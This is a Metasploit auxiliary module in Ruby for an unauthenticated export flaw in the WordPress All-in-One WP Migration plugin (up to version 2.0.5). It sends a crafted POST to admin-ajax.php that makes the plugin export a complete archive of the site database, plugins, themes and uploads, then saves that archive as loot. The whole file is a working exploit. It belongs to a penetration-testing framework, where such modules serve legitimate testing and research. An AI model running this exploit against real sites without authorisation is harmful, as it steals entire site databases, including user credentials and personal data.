##
# This module requires Metasploit: http://www.metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::HTTP::Wordpress
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(
      info,
      'Name'            => 'WordPress All-in-One Migration Export',
      'Description'     => %q(Due to lack of authenticated session verification
                              it is possible for unauthenticated users to export
                              a complete copy of the database, all plugins, themes
                              and uploaded files.),
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          'James Golovich',                  # Disclosure
          'Rob Carr <rob[at]rastating.com>'  # Metasploit module
        ],
      'References'      =>
        [
          ['WPVDB', '7857']
        ],
      'DisclosureDate'  => 'Mar 19 2015'
    ))

    register_options(
      [
        OptInt.new('MAXTIME', [ true, 'The maximum number of seconds to wait for the export to complete', 300 ])
      ], self.class)
  end

  def exporter_url
    normalize_uri(plugin_url, 'modules', 'export', 'templates', 'export.php')
  end

  def check
    check_plugin_version_from_readme('all-in-one-wp-migration', '2.0.5')
  end

  def run
    print_status("#{peer} - Requesting website export...")
    res = send_request_cgi(
      {
        'method'    => 'POST',
        'uri'       => wordpress_url_admin_ajax,
        'vars_get'  => { 'action' => 'router' },
        'vars_post' => { 'options[action]' => 'export' }
      }, datastore['MAXTIME'])

    if res.nil?
      print_error("#{peer} - No response from the target")
      return
    elsif res.code != 200
      print_error("#{peer} - Server responded with status code #{res.code}")
      return
    end

    store_path = store_loot('wordpress.export', 'zip', datastore['RHOST'], res.body, 'wordpress_backup.zip', 'WordPress Database and Content Backup')
    print_good("#{peer} - Backup archive saved to #{store_path}")
  end
end
